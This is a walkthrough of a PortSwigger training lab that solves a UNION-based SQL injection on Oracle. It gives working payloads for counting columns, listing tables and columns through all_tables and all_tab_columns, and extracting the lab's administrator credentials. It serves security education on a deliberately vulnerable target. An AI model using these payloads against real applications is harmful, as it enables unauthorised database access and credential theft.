[Lab: SQL injection attack, listing the database contents on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)  


## Steps to Solve

1. **Launch the Lab:** Open the PortSwigger lab and navigate to the shop interface.

2. **Intercept the Request:** Click on the **Accessories** category and intercept the category filter request using Burp Suite.

3. **Determine the Number of Columns:** Use `ORDER BY` to identify the number of columns.

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

- `ORDER BY 1` – Success
- `ORDER BY 2` – Success
- `ORDER BY 3` – Error

**Result:** The query returns two columns.

4. **Identify Text-Compatible Columns:** Use the following Oracle payload:

```sql
' UNION SELECT 'abc', 'def' FROM dual--
```

**Result:** Both columns accept text data.

5. **Find Database Table Names:** Query `all_tables`:

```sql
' UNION SELECT table_name, NULL FROM all_tables--
```

**Result:** Identified the credentials table: `USERS_GWHJTH`.

6. **Find Column Names:** Query `all_tab_columns`:

```sql
' UNION SELECT column_name, NULL
FROM all_tab_columns
WHERE table_name = 'USERS_GWHJTH'--
```

**Result:** Found two columns:
- `USERNAME_MYUTTC`
- `PASSWORD_ZNQXYY`

7. **Retrieve User Credentials:** Extract the credentials:

```sql
' UNION SELECT USERNAME_MYUTTC, PASSWORD_ZNQXYY
FROM USERS_GWHJTH--
```

**Result:** Retrieved the administrator credentials.

- **Username:** `administrator`
- **Password:** `yr27x75rqqcucamp9u23`

8. **Login and Complete the Lab:** Open the login page and log in using the administrator credentials. Successful login completes the lab.

## Key Takeaways

- **UNION SELECT:** Retrieves data from additional database queries.
- **DUAL:** Special Oracle table used for selecting expressions.
- **ALL_TABLES:** Lists accessible database tables.
- **ALL_TAB_COLUMNS:** Provides column information for accessible tables.
- **Credential Extraction:** Retrieves usernames and passwords from database tables.

## Lab Information

- **Vulnerability:** SQL Injection (SQLi)
- **Attack Type:** UNION-Based SQL Injection
- **Database:** Oracle
- **Tool:** Burp Suite Community Edition
